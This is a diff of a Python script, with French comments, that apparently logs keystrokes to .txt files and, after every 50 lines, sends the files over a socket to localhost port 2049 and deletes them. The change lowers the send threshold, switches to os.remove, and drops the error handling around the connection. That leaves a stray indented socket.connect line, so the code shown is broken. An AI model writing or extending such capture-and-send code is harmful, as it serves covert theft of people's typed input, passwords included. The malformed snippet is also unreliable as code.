@@ -83,12 +83,11 @@ def list(k):
             if k[1] == "$":
                 k = "']'"
         string = string + k[1]
-    if count_line >= 100 :
+    if count_line >= 50 :
         count_line = 0
         try:
             send_files()
-            open(namefile, "w").close()  #supprime le .txt en cours dans lequel le script écrit actuellement
-                                         #mais useless vu qu'on supprime dans send_files pour finir
+            os.remove(namefile)  #supprime le .txt en cours dans lequel le script écrit actuellement                                         #mais useless vu qu'on supprime dans send_files pour finir
         except:
             with open(namefile, "a") as f:
                 f.write("\n send_files ERROR \n")
@@ -127,10 +126,7 @@ def send_files():
     for file in temp_liste:
         if file.find(".txt") != -1:
             liste.append(file)
-    try:
         socket.connect(("localhost", 2049))
-    except:
-        print('CONNECT ERROR')
     # For every .txt file
     for text_file in liste:
         text_lines = []
